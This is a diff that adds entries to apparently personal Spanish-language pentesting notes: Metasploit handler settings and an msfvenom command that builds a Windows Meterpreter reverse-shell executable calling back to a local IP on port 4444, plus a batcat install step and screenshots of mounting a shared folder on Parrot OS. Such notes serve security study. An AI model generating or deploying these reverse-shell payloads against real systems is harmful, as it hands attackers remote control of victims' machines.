@@ -880,6 +880,43 @@ Como nota se puede usar el modo 22000 solo en versiones mayores a hashcat
 
 > https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
 
+
+## Meterpreter
+
+msfconsole
+
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp 
+set lhost IP
+set lport 4444 ( auque por default deja este)
+```
+
+msfvenom
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.27 lport=4444 -f exe > shell.exe
+
+```
+
+
+## Instalar Batcat en Debian
+
+```
+sudo apt install bat
+```
+## Conectarse a una carpeta compartida Parrot OS
+
+![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/a7147815-22ba-408e-99ae-27221a93b14f)
+
+
+![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/ea8c60e7-ab59-4fbd-bfd7-313715b16bc8)
+
+![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/eda9096a-38cd-463d-9211-03973f3179b3)
+
+![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/c6d01bf0-9b86-4051-98b1-9ef74b8fb81b)
+
+
 ## Bibliografias 
 
 /dev/tcp
